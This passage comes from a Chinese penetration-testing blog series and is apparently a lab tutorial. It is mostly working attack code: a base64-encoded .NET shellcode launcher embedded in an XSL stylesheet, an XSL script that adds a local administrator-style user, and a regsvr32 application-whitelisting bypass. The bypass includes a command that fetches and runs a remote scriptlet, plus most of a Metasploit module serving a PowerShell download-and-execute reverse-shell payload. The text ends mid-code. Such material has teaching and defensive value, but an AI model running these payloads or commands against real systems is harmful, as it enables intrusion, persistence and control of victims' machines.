class="string">"BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z"</span>+</span><br><span class="line"><span class="string">"MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA"</span>+</span><br><span class="line"><span class="string">"ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA"</span>+</span><br><span class="line"><span class="string">"DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB"</span>+</span><br><span class="line"><span class="string">"AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC"</span>+</span><br><span class="line"><span class="string">"hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA"</span>+</span><br><span class="line"><span class="string">"AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA"</span>+</span><br><span class="line"><span class="string">"aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA"</span>+</span><br><span class="line"><span class="string">"AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA"</span>+</span><br><span class="line"><span class="string">"BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu"</span>+</span><br><span class="line"><span class="string">"ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA"</span>+</span><br><span class="line"><span class="string">"UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB/AAEAAAEJ"</span>+</span><br><span class="line"><span class="string">"AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA"</span>+</span><br><span class="line"><span class="string">"AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD"</span>+</span><br><span class="line"><span class="string">"b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA"</span>+</span><br><span class="line"><span class="string">"UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT"</span>+</span><br><span class="line"><span class="string">"aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs"</span>+</span><br><span class="line"><span class="string">"cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh"</span>+</span><br><span class="line"><span class="string">"dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp"</span>+</span><br><span class="line"><span class="string">"dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u"</span>+</span><br><span class="line"><span class="string">"AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0"</span>+</span><br><span class="line"><span class="string">"dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA"</span>+</span><br><span class="line"><span class="string">"Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB"</span>+</span><br><span class="line"><span class="string">"QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T"</span>+</span><br><span class="line"><span class="string">"dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs"</span>+</span><br><span class="line"><span class="string">"cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F"</span>+</span><br><span class="line"><span class="string">"eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A"</span>+</span><br><span class="line"><span class="string">"RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp"</span>+</span><br><span class="line"><span class="string">"ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ"</span>+</span><br><span class="line"><span class="string">"AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH"</span>+</span><br><span class="line"><span class="string">"AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy"</span>+</span><br><span class="line"><span class="string">"YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl"</span>+</span><br><span class="line"><span class="string">"Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs"</span>+</span><br><span class="line"><span class="string">"dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy"</span>+</span><br><span class="line"><span class="string">"aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW"</span>+</span><br><span class="line"><span class="string">"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"</span>+</span><br><span class="line"><span class="string">"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA"</span>+</span><br><span class="line"><span class="string">"RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE"</span>+</span><br><span class="line"><span class="string">"AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A"</span>+</span><br><span class="line"><span class="string">"AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp"</span>+</span><br><span class="line"><span class="string">"AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA"</span>+</span><br><span class="line"><span class="string">"bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu"</span>+</span><br><span class="line"><span class="string">"AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA"</span>+</span><br><span class="line"><span class="string">"NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB"</span>+</span><br><span class="line"><span class="string">"AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"</span>+</span><br><span class="line"><span class="string">"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> entry_class = <span class="string">'ShellCodeLauncher.Program'</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">setversion();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stm = base64ToStream(serialized_obj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fmt = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> al = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Collections.ArrayList'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = fmt.Deserialize_2(stm);</span><br><span class="line"></span><br><span class="line">al.Add(<span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class); </span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">debug(e.message);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">]]&gt; <span class="xml"><span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/stylesheet&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Micropoor_2003.xsl:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">stylesheet</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:ms</span>=<span class="string">"urn:schemas‐microsoft‐com:xslt"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">"placeholder"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements</span>‐<span class="attr">prefix</span>=<span class="string">"user"</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;![CDATA[ </span><br><span class="line"></span><br><span class="line">var r = new ActiveXObject("WScript.Shell").Run("net user Micropoor Micropoor /add");</span><br><span class="line"></span><br><span class="line">]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>79、基于白名单Regsvr32执行payload第九季</title>
      <link href="/article/79_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B9%9D%E5%AD%A3.html"/>
      <url>/article/79_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B9%9D%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，身体特别重要。</p><h3 id="Regsvr32简介："><a href="#Regsvr32简介：" class="headerlink" title="Regsvr32简介："></a>Regsvr32简介：</h3><p>Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。但搭配regsvr32.exe使用的 DLL，需要提供 DllRegisterServer 和 DllUnregisterServer两个输出函式，或者提供DllInstall输出函数。</p><p><strong>说明：</strong>Regsvr32.exe所在路径已被系统添加PATH环境变量中，因此，Regsvr32命令可识别。</p><p>Windows 2003 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\SysWOW64\regsvr32.exe</span><br><span class="line">C:\WINDOWS\system32\regsvr32.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.119 Windows 2003  </p><p>msf 已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无exploit版本regsvr32，文章结尾补充。</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(server/regsvr32_command_delivery_server) &gt; use auxiliary/server/regsvr32_command_delivery_server</span><br><span class="line">msf auxiliary(server/regsvr32_command_delivery_server) &gt; set CMD net user Micropoor Micropoor /add</span><br><span class="line">CMD =&gt; net user Micropoor Micropoor /add</span><br><span class="line">msf auxiliary(server/regsvr32_command_delivery_server) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/ybn7xESQYCGv</span><br><span class="line">[*] Local IP: http://192.168.1.4:8080/ybn7xESQYCGv</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line"></span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.1.4:8080/ybn7xESQYCGv scrobj.dll</span><br></pre></td></tr></table></figure><p><img src="../do/media/415719c964de78a36a9cad8e7d273025.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /n /u /i:http://192.168.1.4:8080/ybn7xESQYCGv scrobj.dll</span><br></pre></td></tr></table></figure><p><img src="../do/media/d6dba86fd41bcac90db86ecc3dc6e7e7.jpg" alt></p><p><img src="../do/media/392c2c955e7d666b5015f30149866cf5.jpg" alt>  </p><p><img src="../do/media/d9c0e792eced1468f86880e42bc28a56.jpg" alt>  </p><p><img src="../do/media/d70caf10069603b0d0bffa73ecbabc29.jpg" alt></p><h3 id="附：powershell-版-Regsvr32"><a href="#附：powershell-版-Regsvr32" class="headerlink" title="附：powershell 版 Regsvr32"></a>附：powershell 版 Regsvr32</h3><p><strong>regsvr32_applocker_bypass_server.rb</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This module requires Metasploit: http://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit‐framework</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">Rank = ManualRanking </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> Msf::Exploit::Powershell</span><br><span class="line"><span class="keyword">include</span> Msf::Exploit::Remote::HttpServer </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line"><span class="keyword">super</span>(update_info(info,</span><br><span class="line"><span class="string">'Name'</span> =&gt; <span class="string">'Regsvr32.exe (.sct) Application Whitelisting Bypass Serve r'</span>, <span class="string">'Description'</span> =&gt; <span class="string">%q(</span></span><br><span class="line"><span class="string">This module simplifies the Regsvr32.exe Application Whitelisting Bypass technique.</span></span><br><span class="line"><span class="string">The module creates a web server that hosts an .sct file. When the user types the provided regsvr32 command on a system, regsvr32 will request the .sct file and then execute the included PowerShell command.</span></span><br><span class="line"><span class="string">This command then downloads and executes the specified payload (similar to the web_delivery module with PSH)</span>.</span><br><span class="line">Both web requests (i.e., the .sct file <span class="keyword">and</span> PowerShell download <span class="keyword">and</span> execute) can occur on the same port.</span><br><span class="line">),</span><br><span class="line"></span><br><span class="line"><span class="string">'License'</span> =&gt; MSF_LICENSE,</span><br><span class="line"><span class="string">'Author'</span> =&gt;</span><br><span class="line">[</span><br><span class="line"><span class="string">'Casey Smith'</span>, <span class="comment"># AppLocker bypass research and vulnerability discover y(\<span class="doctag">@subTee</span>)</span></span><br><span class="line"><span class="string">'Trenton Ivey'</span>, <span class="comment"># MSF Module (kn0)</span></span><br><span class="line">],</span><br><span class="line"><span class="string">'DefaultOptions'</span> =&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">'Payload'</span> =&gt; <span class="string">'windows/meterpreter/reverse_tcp'</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">'Targets'</span> =&gt; [[<span class="string">'PSH'</span>, &#123;&#125;]],</span><br><span class="line"><span class="string">'Platform'</span> =&gt; <span class="string">%w(win)</span>,</span><br><span class="line"><span class="string">'Arch'</span> =&gt; [ARCH_X86, ARCH_X86_64],</span><br><span class="line"><span class="string">'DefaultTarget'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">'DisclosureDate'</span> =&gt; <span class="string">'Apr 19 2016'</span>,</span><br><span class="line"><span class="string">'References'</span> =&gt;</span><br><span class="line">[</span><br><span class="line">[<span class="string">'URL'</span>, <span class="string">'http://subt0x10.blogspot.com/2016/04/bypass‐application‐whitelisting‐script.html'</span>]</span><br><span class="line">]</span><br><span class="line">))</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primer</span></span></span><br><span class="line">print_status(<span class="string">'Run the following command on the target machine:'</span>)</span><br><span class="line">print_line(<span class="string">"regsvr32 /s /n /u /i:\#&#123;get_uri&#125;.sct scrobj.dll"</span>)</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_request_uri</span><span class="params">(cli, _request)</span></span></span><br><span class="line"><span class="comment"># If the resource request ends with '.sct', serve the .sct file</span></span><br><span class="line"><span class="comment"># Otherwise, serve the PowerShell payload</span></span><br><span class="line"><span class="keyword">if</span> _request.raw_uri =~ <span class="regexp">/\.sct$/</span></span><br><span class="line">serve_sct_file</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">serve_psh_payload</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serve_sct_file</span></span></span><br><span class="line">print_status(<span class="string">"Handling request for the .sct file from <span class="subst">#&#123;cli.peerhost&#125;</span>"</span>)</span><br><span class="line">ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate <span class="keyword">if</span> ssl</span><br><span class="line">download_string = Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(get_uri)</span><br><span class="line">download_and_run = <span class="string">"<span class="subst">#&#123;ignore_cert&#125;</span><span class="subst">#&#123;download_string&#125;</span>"</span></span><br><span class="line">psh_command = generate_psh_command_line(</span><br><span class="line"><span class="symbol">noprofile:</span> <span class="literal">true</span>,</span><br><span class="line"><span class="symbol">windowstyle:</span> <span class="string">'hidden'</span>,</span><br><span class="line"><span class="symbol">command:</span> download_and_run</span><br><span class="line">)</span><br><span class="line">data = gen_sct_file(psh_command)</span><br><span class="line">send_response(cli, data, <span class="string">'Content‐Type'</span> =&gt; <span class="string">'text/plain'</span>)</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serve_psh_payload</span></span></span><br><span class="line">print_status(<span class="string">"Delivering payload to <span class="subst">#&#123;cli.peerhost&#125;</span>"</span>)</span><br><span class="line">data = cmd_psh_payload(payload.encoded,</span><br><span class="line">payload_instance.arch.first,</span><br><span class="line"><span class="symbol">remove_comspec:</span> <span class="literal">true</span>,</span><br><span class="line"><span class="symbol">use_single_quotes:</span> <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line">send_response(cli,data,<span class="string">'Content‐Type'</span> =&gt; <span class="string">'application/octet‐stream'</span>)</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_class_id</span></span></span><br><span class="line"><span class="string">"<span class="subst">#&#123;Rex::Text.rand_text_hex <span class="number">8</span>&#125;</span>‐<span class="subst">#&#123;Rex::Text.rand_text_hex <span class="number">4</span>&#125;</span>‐<span class="subst">#&#123;Rex::Text.rand_text_hex <span class="number">4</span>&#125;</span>‐<span class="subst">#&#123;Rex::Text.rand_text_hex <span class="number">4</span>&#125;</span>‐<span 